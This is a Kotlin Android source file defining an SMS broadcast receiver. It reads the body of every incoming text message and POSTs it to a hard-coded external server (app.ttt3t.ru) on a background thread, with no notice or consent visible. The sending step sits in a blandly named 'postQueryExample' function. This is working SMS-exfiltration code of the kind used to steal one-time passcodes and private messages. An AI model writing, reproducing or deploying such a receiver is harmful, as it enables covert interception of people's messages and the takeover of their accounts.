package com.smdevisiors.smsreceive

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage
import android.util.Log
import okhttp3.FormBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import java.io.IOException
import java.lang.Exception

class ReceiveSms : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if(intent?.action?.equals("android.provider.Telephony.SMS_RECEIVED")!!){
            var bundle = intent.extras
            var msgs: Array<SmsMessage?>
            var msg_from: String
            if(bundle != null){
                try{
                    var pdus: Array<Object> = bundle.get("pdus") as Array<Object>
                    msgs = arrayOfNulls(pdus.size)
                    for (i in msgs.indices) {
                        msgs[i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
                        msg_from = msgs[i]?.originatingAddress.toString()
                        var msgBody = msgs[i]?.messageBody
                        postQueryExample(msgBody)
                    }
                } catch (e: Exception){
                    e.printStackTrace()
                }
            }
        }
    }

    fun postQueryExample(string: String?) {
        Thread {
            val okHttpClient = OkHttpClient()
            val formBody: RequestBody = FormBody.Builder()
                .add("text", string.toString())
                .build()
            val request: Request = Request.Builder()
                .url("https://app.ttt3t.ru/sms/new/")
                .post(formBody)
                .build()
            try {
                val response = okHttpClient.newCall(request).execute()
                val stringResponse = response.body!!.string()
            } catch (e: IOException) {
                Log.e("ERROR", "Exception: " + Log.getStackTraceString(e))
            }
        }.start()
    }
}